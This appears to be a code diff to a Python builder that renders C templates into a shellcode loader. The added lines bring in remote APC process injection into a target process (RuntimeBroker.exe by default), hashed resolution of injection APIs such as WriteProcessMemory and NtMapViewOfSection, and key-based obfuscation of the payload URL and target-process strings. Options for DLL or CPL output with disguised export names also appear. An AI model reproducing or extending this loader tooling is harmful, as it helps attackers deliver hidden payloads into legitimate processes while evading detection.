@@ -32,7 +32,10 @@ def _get_api_hashes():
         "WinHttpOpen", "WinHttpConnect", "WinHttpOpenRequest", "WinHttpSendRequest",
         "WinHttpReceiveResponse", "WinHttpQueryDataAvailable", "WinHttpReadData",
         "WinHttpCloseHandle", "WinHttpCrackUrl", "WinHttpSetOption", "WinHttpQueryHeaders",
-        "RtlZeroMemory", "FindResourceA", "LoadResource", "LockResource", "SizeofResource"
+        "RtlZeroMemory", "FindResourceA", "LoadResource", "LockResource", "SizeofResource",
+        "CreateProcessA", "VirtualAllocEx", "WriteProcessMemory", "QueueUserAPC", "ResumeThread",
+        "lstrlenA", "GetEnvironmentVariableA", "VirtualProtectEx", "GetLastError",
+        "NtCreateSection", "NtMapViewOfSection"
     ]
     module_names = ["KERNEL32.DLL", "NTDLL.DLL", "CABINET.DLL", "WINHTTP.DLL"]
     
@@ -49,14 +52,22 @@ def _prepare_template_context(options, input_filepath):
     """Prepares the complete dictionary of variables to be passed to the Jinja2 template."""
     template_vars = {}
     
-    # API Resolve context
+    obfuscate_http_strings = options.get('obfuscate_http_strings') == 'true'
+    obfuscate_execution_strings = options.get('obfuscate_execution_strings') == 'true'
+    
+    string_obfuscation_needed = obfuscate_http_strings or obfuscate_execution_strings
+    template_vars['string_obfuscation_needed'] = string_obfuscation_needed
+
+    if string_obfuscation_needed:
+        key = random.randint(1, 255)
+        template_vars['obfuscation_key'] = key
+
     api_resolver_choice = options.get('api_resolver', 'string')
     template_vars['api_resolver'] = api_resolver_choice
     template_vars['api_resolver_partial'] = f"partials/api_resolver_{api_resolver_choice}.c.j2"
     if api_resolver_choice == 'hashed':
         template_vars.update(_get_api_hashes())
 
-    # Data Source context
     data_source_choice = options.get('data_source', 'embedded')
     template_vars['data_source'] = data_source_choice
     if data_source_choice == 'embedded':
@@ -64,18 +75,13 @@ def _prepare_template_context(options, input_filepath):
     else:
         template_vars['data_source_partial'] = f"partials/datasource_{data_source_choice}.c.j2"
     
-    # Handle data source specific variables (obfuscation, paths, etc.)
-    obfuscate_strings = options.get('obfuscate_strings') == 'true'
-    template_vars['obfuscate_strings'] = obfuscate_strings
-
     if data_source_choice == 'file':
         template_vars['file_path'] = options.get('file_path', '').replace('\\', '\\\\')
     elif data_source_choice == 'http':
         url = options.get('url', '')
         user_agent = options.get('user_agent', 'Mozilla/5.0')
-        if obfuscate_strings:
-            key = random.randint(1, 255)
-            template_vars['obfuscation_key'] = key
+        template_vars['obfuscate_http_strings'] = obfuscate_http_strings
+        if obfuscate_http_strings:
             template_vars['url_obfuscated'] = _obfuscate_string(url, key)
             template_vars['user_agent_obfuscated'] = _obfuscate_string(user_agent, key)
         else:
@@ -84,15 +90,28 @@ def _prepare_template_context(options, input_filepath):
         template_vars['trust_invalid_cert'] = 1 if options.get('trust_invalid_cert') == 'true' else 0
 
     output_format = options.get('output_format', 'exe')
+    allocation_method_choice = options.get('allocation_method', 'virtualalloc')
+    execution_method_choice = options.get('execution_method', 'newthread')
+
     template_vars.update({
-        'allocation_partial': f"partials/alloc_{options.get('allocation_method', 'virtualalloc')}.c.j2",
-        'execution_partial': f"partials/exec_{options.get('execution_method', 'newthread')}.c.j2",
+        'allocation_method': allocation_method_choice,
+        'execution_method': execution_method_choice,
+        'allocation_partial': f"partials/alloc_{allocation_method_choice}.c.j2",
+        'execution_partial': f"partials/exec_{execution_method_choice}.c.j2",
         'output_format': output_format,
         'export_name': 'CPlApplet' if output_format == 'cpl' else options.get('export_name', 'DllRegisterServer'),
         'debug_mode': (options.get('debug_mode') == 'true'),
         'bytecode_transformation': options.get('bytecode_encoding'),
         'bytecode_compression': options.get('bytecode_compression')
     })
+
+    if execution_method_choice == 'remoteapc':
+        target_process = options.get('target_process', 'RuntimeBroker.exe')
+        template_vars['obfuscate_execution_strings'] = obfuscate_execution_strings
+        if obfuscate_execution_strings:
+            template_vars['target_process_obfuscated'] = _obfuscate_string(target_process, key)
+        else:
+            template_vars['target_process'] = target_process
     
     return template_vars
 
